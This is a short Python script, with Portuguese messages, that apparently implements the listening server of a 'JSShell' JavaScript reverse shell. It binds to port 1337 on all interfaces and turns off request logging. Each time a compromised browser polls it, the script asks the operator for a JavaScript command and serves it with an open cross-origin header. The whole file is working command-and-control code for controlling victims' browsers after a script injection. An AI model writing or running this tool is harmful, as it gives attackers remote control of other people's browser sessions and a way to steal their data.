import sys
from http.server import BaseHTTPRequestHandler, HTTPServer

class JSShellHTTPHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        return

    def do_GET(self):
        print(f"\n[*] Conexão recebida de: {self.path}")
        
        try:
            comando = input("JSShell> ")
        except (KeyboardInterrupt, EOFError):
            print("\n[*] Encerrando o servidor...")
            sys.exit(0)
            
        self.send_response(200)
        self.send_header('Content-Type', 'application/javascript')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        
        self.wfile.write(comando.encode('utf-8'))

def rodar():
    port = 1337
    server = HTTPServer(('0.0.0.0', port), JSShellHTTPHandler)
    print(f"[*] Escutando requisições HTTP na porta {port}...")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Servidor desligado.")

if __name__ == "__main__":
    rodar()
